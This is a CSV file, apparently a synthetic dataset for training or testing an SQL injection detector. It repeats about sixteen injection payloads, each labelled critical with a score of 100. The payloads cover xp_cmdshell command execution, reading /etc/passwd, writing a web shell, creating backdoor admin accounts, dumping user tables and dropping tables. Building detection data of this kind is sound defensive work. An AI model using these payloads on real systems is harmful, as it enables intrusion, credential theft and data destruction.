query,risk,score
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # e,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # j,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # v,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # p,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # u",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # m",critical,100
'; DROP TABLE users; -- /* test */ # 4,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # h,critical,100
'; SELECT load_file('/etc/passwd'); # # 9,critical,100
'; SELECT * FROM mysql.user; -- # 2,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 0,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # o,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # o,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # n",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # f,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # k,critical,100
'; SELECT * FROM mysql.user; -- # 5,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # i,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # c",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 8,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 4",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # v,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # j,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # c,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # n,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # z,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT * FROM mysql.user; -- # y,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 5,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 7",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # p",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 2,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # r",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 2",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # q,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 4,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # x,critical,100
'; DROP TABLE users; -- /* test */ # 4,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # n,critical,100
'; SELECT load_file('/etc/passwd'); # # 9,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT * FROM mysql.user; -- # f,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 7,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # e",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # v,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # 3,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # z,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 8,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 4,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # l,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # b,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # r,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # p,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # f",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # t,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # d",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # w,critical,100
'; SELECT load_file('/etc/passwd'); # # o,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # m,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 8,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # u,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # v,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # g,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # p,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # c,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 3",critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 7",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 7",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # p,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # y,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 8",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT * FROM mysql.user; -- # v,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # c,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 9,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # o",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # b,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 2,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # d",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # n,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # u,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # b,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # w,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # l,critical,100
'; SELECT load_file('/etc/passwd'); # # c,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DROP TABLE users; -- /* test */ # 5,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # v,critical,100
'; SELECT * FROM mysql.user; -- # s,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # r,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # s,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # o",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 7,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # e,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # w,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # j,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # a,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # 5,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # x",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # t,critical,100
"' UNION SELECT username, password FROM users /**/ /* # r",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # i,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # 4,critical,100
"' UNION SELECT username, password FROM users /**/ /* # z",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # v,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # y,critical,100
"' UNION SELECT username, password FROM users /**/ /* # h",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 1,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # k,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # h,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # k,critical,100
'; DROP TABLE users; -- /* test */ # 3,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # m",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # g,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # j,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # a",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # p,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # m,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # i,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # u,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 1",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # k,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # x,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 2,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 6",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # p,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # p,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 8,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # f",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 0,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # g,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 7,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # n",critical,100
'; DROP TABLE users; -- /* test */ # b,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # w,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 3",critical,100
"' UNION SELECT username, password FROM users /**/ /* # 6",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # z,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 2,critical,100
'; DROP TABLE users; -- /* test */ # 3,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 3",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # e",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 0,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 8",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # y",critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # r,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # x,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # q,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 6",critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # x,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 8,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # z,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # v,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # k",critical,100
'; SELECT load_file('/etc/passwd'); # # 3,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # 8",critical,100
'; DROP TABLE users; -- /* test */ # o,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # f,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # y,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # o",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # g",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # 5,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # d,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # m,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # z,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT * FROM mysql.user; -- # e,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # q,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # u,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # m,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
"' UNION SELECT username, password FROM users /**/ /* # n",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 6,critical,100
'; SELECT load_file('/etc/passwd'); # # v,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # a,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # a,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 6,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # x,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
